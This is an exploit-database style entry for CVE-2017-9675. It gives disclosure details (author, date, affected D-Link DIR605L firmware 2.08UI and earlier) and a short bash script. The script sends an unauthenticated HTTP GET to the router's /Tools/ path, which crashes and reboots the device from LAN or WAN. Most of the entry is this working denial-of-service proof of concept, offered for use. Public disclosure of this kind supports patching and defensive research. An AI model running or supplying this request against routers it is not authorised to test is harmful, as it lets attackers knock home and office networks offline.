# Exploit Title: D-Link DIR605L <=2.08 Denial of Service via HTTP GET (CVE-2017-9675)
# Date: 2017-06-15
# Exploit Author: Enrique Castillo
# Detailed Analysis: http://hypercrux.com/bug-report/2017/06/19/DIR605L-DoS-BugReport/
# Vendor Homepage: http://us.dlink.com/
# Software Link: specific version no longer available on vendor site
# Version: 2.08UI and prior
# CVE : CVE-2017-9675
# Tested on Linux
###
# Description: Firmware versions 2.08UI and lower contain a bug in the function that handles HTTP GET requests for 
# directory paths that can allow an unauthenticated attacker to cause complete denial of service (device reboot). This bug can be triggered 
# from both LAN and WAN.
###
#!/usr/bin/env bash
# usage: ./sploit.sh <router_ip>
ROUTER=$1

if [ "$#" -ne 1 ]; then
    echo "usage: $0 <router_ip>"
    exit
fi
    
curl http://$ROUTER/Tools/
